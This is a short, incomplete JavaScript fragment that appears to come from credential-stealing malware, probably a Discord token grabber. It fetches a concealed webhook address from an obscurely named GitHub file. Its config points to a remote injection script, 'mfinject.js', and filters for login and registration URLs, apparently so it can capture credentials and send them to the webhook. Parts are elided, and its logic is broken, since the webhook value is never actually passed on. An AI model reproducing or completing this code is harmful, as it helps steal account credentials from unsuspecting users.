...
async function getwh() {
    const wLink = 'https://raw.githubusercontent.com/Raplhs/13371.1337ext73318337/main/73C4.txt';
    axios.get(wLink).then(response => {
    const html = response.data;
    const $ = cheerio.load(html);
    const rtxt = $('body').text();

    const wtxtFinal = rtxt.replace(/\s/g, '');
  })
  .catch(error => {
    console.error(error);
  });
...
getwh();
const CONFIG = {
    webhook: getwh.wtxtFinal,
    injection_url: "https://raw.githubusercontent.com/Raplhs/444444iew543333/main/mfinject.js",
    filters: {
        urls: [
            '/auth/login',
            '/auth/register',
